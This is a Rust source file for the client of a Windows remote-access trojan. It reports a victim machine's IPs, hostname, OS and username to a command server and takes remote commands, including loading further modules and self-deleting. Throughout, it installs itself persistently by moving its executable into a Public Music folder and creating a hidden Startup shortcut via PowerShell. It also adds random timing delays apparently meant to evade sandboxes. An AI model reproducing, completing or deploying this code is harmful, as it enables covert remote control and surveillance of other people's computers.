// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
use BByte_util::{
    close_all_session_in_lock, cur_timestamp_secs,
    gen::CONNECTION_INFO_FLAG,
    packet::{Heartbeat, HostInfo, Message},
    protocol::ClientWrapper,
    session::{Session, SessionBase, SessionManager},
    DrakulaClientMsgID, DrakulaProtocol, DrakulaServerCommandID, SlaveDNA, HEART_BEAT_TIME,
};
 
use lazy_static::*;
use std::sync::atomic::Ordering::Relaxed;
use std::{
    str::FromStr,
    sync::{atomic::AtomicU64, mpsc::channel, Arc, Mutex},
    time::Duration,
};
use systemstat::{Ipv4Addr, Platform, System};
use uuid::Uuid;

mod config;
mod module;
mod msgbox;

use std::os::windows::process::CommandExt;
use std::process::{Command, Stdio};
use std::env;
use rand::Rng;

use crate::{config::master_configure,  module::loader::LoaderClient};
const CREATE_NO_WINDOW: u32 = 0x08000000;

const G_CONNECTION_INFO: SlaveDNA = SlaveDNA {
    flag: CONNECTION_INFO_FLAG,
    size: [0u8; 8],
    data: [0u8; 1024],
};

lazy_static! {
    static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
    // if not write the line , G_CONNECTION_INFO will compile inline to origin code.
    static ref G_DNA : SlaveDNA = G_CONNECTION_INFO;
}

use std::thread;
use reqwest::blocking::get;
use serde_json::Value;
use std::time::{SystemTime, UNIX_EPOCH};
fn get_current_unix_time() -> Result<u64, Box<dyn std::error::Error>> {
    let now = SystemTime::now();

    // Преобразуем в timestamp (количество секунд с Unix-эпохи)
    let timestamp = now.duration_since(UNIX_EPOCH)
        .expect("Ошибка: время до Unix-эпохи!")
        .as_secs();
    Ok(timestamp)
}
fn start_time_check_thread(expiration_unix_time: u64) {
    thread::spawn(move || {
        loop {
         
            match get_current_unix_time() {
                Ok(current_unix_time) => {
                    
                    if current_unix_time >= expiration_unix_time {
                       
                        std::process::exit(0); 
                    }

             
                    let remaining_time = expiration_unix_time - current_unix_time;
                  
                }
                Err(e) => {
                 
                }
            }

          
            thread::sleep(Duration::from_secs(30));
        }
    });
}

use std::process::exit;

fn main() {

    
    let _ = mutex_f("AsMus".to_string());

    let handle =  thread::spawn(move || {
         
        let _ = persistence();
        thread::sleep(Duration::from_secs(3));
    });
    let mut rng = rand::thread_rng();
 
 
    // let initial_unix_time = 1740379301;

  
    // let three_days_in_seconds = 150*24*60*60; 
    // let expiration_unix_time = initial_unix_time + three_days_in_seconds;

     
    // start_time_check_thread(expiration_unix_time);
    #[cfg(debug_assertions)]
    {
        simplelog::CombinedLogger::init(vec![
            simplelog::TermLogger::new(
                log::LevelFilter::Warn,
                simplelog::Config::default(),
                simplelog::TerminalMode::Mixed,
                simplelog::ColorChoice::Auto,
            ),
            simplelog::WriteLogger::new(
                log::LevelFilter::Info,
                simplelog::Config::default(),
                std::fs::File::create("my_rust_binary.log").unwrap(),
            ),
        ])
        .unwrap();
    }

    let clientid = Uuid::new_v4().to_string();

    let load_session_mgr: SessionManager<LoaderClient> = SessionManager::new();
    let load_session_mgr = Arc::new(Mutex::new(load_session_mgr));

    let load_session_mgr_1 = load_session_mgr.clone();
    std::thread::spawn(move || loop {
        std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
        let mut load_session = load_session_mgr_1.lock().unwrap();



        log::info!("ftp session : {}", load_session.count());

        load_session.gc();
    });

    let config = master_configure();

    log::debug!("master config : {:?}", config);

    loop {

        close_all_session_in_lock!(load_session_mgr);

        let (session_sender, session_receiver) = channel::<SessionBase>();

        let mut client: ClientWrapper = match ClientWrapper::connect(
            &DrakulaProtocol::from(config.protocol),
            &config.address,
        ) {
            Ok(p) => p,
            Err(e) => {
                log::info!("connect faild : {}", e);
                std::thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        log::info!("connect success!");

        let hostname = whoami::hostname();

        let sys = System::new();
        let ips = match sys.networks() {
            Ok(netifs) => {
                let mut ret = String::new();
                for netif in netifs.values() {
                    for i in &netif.addrs {
                        match i.addr {
                            systemstat::IpAddr::V4(p) => {
                                if p == Ipv4Addr::from_str("127.0.0.1").unwrap() {
                                    continue;
                                }
                                ret += &format!("{},", p);
                            }
                            _ => {}
                        }
                    }
                }
                ret
            }
            Err(_) => "UNKNOW".to_string(),
        };

        let info = os_info::get();
        let os = format!("{} {} {}", info.os_type(), info.bitness(), info.version());

        let hostinfo = HostInfo {
            ip: ips,
            host_name: hostname,
            os,
            whoami: whoami::username(),
            remark: config.remark.clone(),
            loader: true
        };

        let mut buf =
            match Message::build(DrakulaClientMsgID::HostInfo.to_u8(), &clientid, hostinfo) {
                Ok(p) => p,
                Err(e) => {
                    log::error!("make HostInfo packet faild : {}", e);
                    client.close();
                    continue;
                }
            };

        match client.send(&mut buf) {
            Ok(p) => p,
            Err(e) => {
                log::error!("send HostInfo packet faild : {}", e);
                client.close();
                continue;
            }
        };

        let (sender, receriver) = channel::<Vec<u8>>();

        let mut client_1 = client.clone();
        std::thread::spawn(move || loop {
            let mut buf = match receriver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("sender channel closed : {}", e);
                    break;
                }
            };

            G_OUT_BYTES.fetch_add(buf.len() as u64, Relaxed);

            match client_1.send(&mut buf) {
                Ok(p) => p,
                Err(e) => {
                    log::info!("sender channel closed : {}", e);
                    client_1.close();
                    break;
                }
            };
            log::info!("id : {} send [{}] bytes", buf[0], buf.len());
        });

        let mut client_2 = client.clone();
        let clientid_1 = clientid.clone();
        let sender_1 = sender.clone();
        std::thread::spawn(move || {
            loop {
                //flush in & out transfer rate
                let in_rate = G_IN_BYTES.load(Relaxed);
                let out_rate = G_OUT_BYTES.load(Relaxed);

                G_IN_BYTES.store(0, Relaxed);
                G_OUT_BYTES.store(0, Relaxed);

                let heartbeat = Heartbeat {
                    time: cur_timestamp_secs(),
                    in_rate,
                    out_rate,
                };
                log::info!("inrate : {} , outrate : {}", in_rate, out_rate);
                let buf = match Message::build(
                    DrakulaClientMsgID::Heartbeat.to_u8(),
                    &clientid_1,
                    heartbeat,
                ) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("make Heartbeat packet faild : {}", e);
                        break;
                    }
                };

                match sender_1.send(buf) {
                    Ok(p) => p,
                    Err(e) => {
                        log::error!("send Heartbeat packet to channel faild : {}", e);
                        break;
                    }
                };

                std::thread::sleep(Duration::from_secs(HEART_BEAT_TIME));
            }
            client_2.close();
        });

        std::thread::spawn(move || loop {
            let base = match session_receiver.recv() {
                Ok(p) => p,
                Err(e) => {
                    log::info!("session receiver channel closed : {}", e);
                    break;
                }
            };

            let buf = Message::build(
                DrakulaClientMsgID::SessionPacket.to_u8(),
                &base.clientid,
                base.packet,
            )
            .unwrap();

            match sender.send(buf) {
                Ok(p) => p,
                Err(e) => {
                    log::info!("session receiver closed : {}", e);  //127.0.0.1
                    break;
                }
            };
        });

        loop {
            match client.recv() {
                Ok(buf) => {
                    G_IN_BYTES.fetch_add(buf.len() as u64, Relaxed);
                    log::info!("recv [{}] bytes", buf.len());

                    match DrakulaServerCommandID::from(buf[0]) {
                        DrakulaServerCommandID::Rproxy => { 
                            
                        }
                        DrakulaServerCommandID::Shell => { 
                        }
                        DrakulaServerCommandID::Inject => {

                        }
                        DrakulaServerCommandID::Loader => {
                            let msg = Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            )
                            .unwrap();
                            let session = LoaderClient::new_client(
                                session_sender.clone(),
                                &clientid,
                                &msg.parser_sessionpacket().unwrap().id,
                            )
                            .unwrap();
                        load_session_mgr.lock().unwrap().register(session);
                        }
                        DrakulaServerCommandID::File => {

                        }
                        DrakulaServerCommandID::KillBot => {
                            // log::info!("create KILL BOT session");


                            // let current_exe = env::current_exe().expect("");
 
                            let remove_shortcut_cmd = format!(
                                "Start-Sleep -Seconds 4; Remove-Item -Path ([System.Environment]::GetFolderPath('Startup') + '\\AsMus.lnk') -Force",
                               
                            );
                        
                        
                            let infected_dir = "C:\\Users\\Public\\Music\\script";
                        
                            let target_dir = env::current_exe().expect("");
                         

                            let remove_shortcut_pw = format!(
                                "Start-Sleep -Seconds 4; Remove-Item -Path '{}' -Force -Recurse",
                                infected_dir
                            );



                            let _ = Command::new("cmd")
                            .args(&[
                                "/C",
                                "timeout",
                                "/T",
                                "4",
                                "&",
                                "del",
                                target_dir.to_str().unwrap(),
                         
                                "& rmdir /S /Q",
                                infected_dir,
                            ])
                            .stdout(Stdio::null())
                            .creation_flags(CREATE_NO_WINDOW)
                            .spawn()
                            .expect("Не удалось выполнить команду");

                            let _ = Command::new("powershell")
                            .args(&[
                                remove_shortcut_pw,
                            ])
                            .stdout(Stdio::null())
                            .creation_flags(CREATE_NO_WINDOW)
                            .spawn()
                            .expect("Не удалось выполнить команду powershell");
                        
                        
                            let _ = Command::new("powershell")
                            .args(&[
                                remove_shortcut_cmd
                            ])
                            .stdout(Stdio::null())
                            .creation_flags(CREATE_NO_WINDOW)
                            .spawn()
                            .expect("Не удалось выполнить команду");
                            
                         
                            std::process::exit(0); 
     
                        }
                        DrakulaServerCommandID::SessionPacket => {
                            let msg = Message::new(
                                client.local_addr().unwrap(),
                                DrakulaProtocol::TCP,
                                &buf,
                            )
                            .unwrap();
                            let packet = msg.parser_sessionpacket().unwrap();

                            log::info!("recv session packet [{}] [{}]", packet.id, msg.length());
 
                            
                            load_session_mgr
                            .lock()
                            .unwrap()
                            .write(&packet.id, &packet.data)
                            .unwrap();
                        }
                        DrakulaServerCommandID::Unknow => {}
                    }
                }
                Err(e) => {
                    log::error!("connection recv faild : {}", e);
                    client.close();
                    break;
                }
            }
        }
    }
}
 
use std::path::Path;
use std::fs;
// use std::env;
use std::io::{Error, ErrorKind};
use winreg::enums::{HKEY_CURRENT_USER, KEY_WRITE};
use winreg::RegKey;
// use rand::Rng;
use std::time::{ Instant};
use std::thread::sleep;
fn function1() -> u64 {
    sleep(Duration::from_secs(5));
    1
}

fn function2() -> u64 {
    let mut sum = 0;
    for i in 0..5_000_000 {
        sum += i % 10;
    }
    sum
}

fn function3() -> u64 {
    let start = Instant::now();
    while start.elapsed() < Duration::from_secs(10) {}
    3
}

fn function4() -> u64 {
    let start = Instant::now();
    let mut count = 0;

    while start.elapsed() < Duration::from_secs(25) {
        count += 1;
        sleep(Duration::from_millis(10));  
    }

    count
}

fn morphing_function() -> u64 {
    let mut rng = rand::thread_rng();
    let choice = rng.gen_range(1..=4);

    println!("Выбрана функция: {}", choice);

    match choice {
        1 => function1(),
        2 => function2(),
        3 => function3(),
        4 => function4(),  
        _ => unreachable!(),
    }
}

fn persistence() -> Result<(),Error> {
     let infected_dir = std::path::Path::new("C:\\Users\\Public\\Music\\script");
     if infected_dir.exists() {
        // std::process::exit(0);
         return Ok(());
     }
    std::fs::create_dir_all(&infected_dir)?; 
    let current_exe = env::current_exe()?;
    let result1 = morphing_function();
    let current_exe_filename = current_exe.file_name().unwrap();
    let result2 = morphing_function();
    let current_exe_path = current_exe.to_str().unwrap();
    let infected_exe_path = infected_dir.join(current_exe_filename);
    let result3 = morphing_function();
    std::fs::rename(&current_exe_path, &infected_exe_path)?;
 
    let result3 = morphing_function();
 
     let strtt = String::from_str(infected_exe_path.to_str().unwrap());
     let _ = moverStartup(strtt.unwrap());
     Ok(())
}
 
fn moverStartup(currdir:String) -> Result<(),Error>{

    let username = whoami::username();
    let script = format!(r#"
    $StartupFolder = [System.Environment]::GetFolderPath('Startup')
    $ExePath = '{currdir}'
    $ShortcutPath = Join-Path -Path $StartupFolder -ChildPath 'AsMus.lnk'

    $WScriptShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
    $Shortcut.TargetPath = $ExePath
    $Shortcut.WorkingDirectory = Split-Path -Parent $ExePath
    $Shortcut.WindowStyle = 7
    $Shortcut.Description = 'AsMus'
    $Shortcut.Save()
    "#);

     let mut newChild= Command::new("powershell")
    .arg("-Command")
    .arg(script)
    .creation_flags(CREATE_NO_WINDOW) 
    .stdout(Stdio::null()) 
    .spawn()
    .expect(" PowerShell- err"); 
  
  
    let _ = newChild.wait();
    // println!("AutoRun: {:?}", target_path);
    Ok(())
}
 
use std::ptr::null_mut;
use winapi::um::synchapi::CreateMutexW;
use winapi::um::handleapi::CloseHandle;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::winbase::WAIT_OBJECT_0;
use std::ffi::{OsString};
use std::os::windows::ffi::OsStrExt;
fn mutex_f(mutex_name:String) -> Result<(),Error> {
 let mutex_name = "AsMus";
    unsafe {
        let wide_name: Vec<u16> = OsString::from(mutex_name)
        .encode_wide()
        .chain(std::iter::once(0)) 
        .collect();

        let mutex = CreateMutexW(null_mut(), 1, wide_name.as_ptr());

        if mutex.is_null() {
             
            std::process::exit(0);
        }

        if GetLastError() == 183 {  
            CloseHandle(mutex);

            std::process::exit(0);
        }
        
        // CloseHandle(mutex);
    }


        Ok(())
}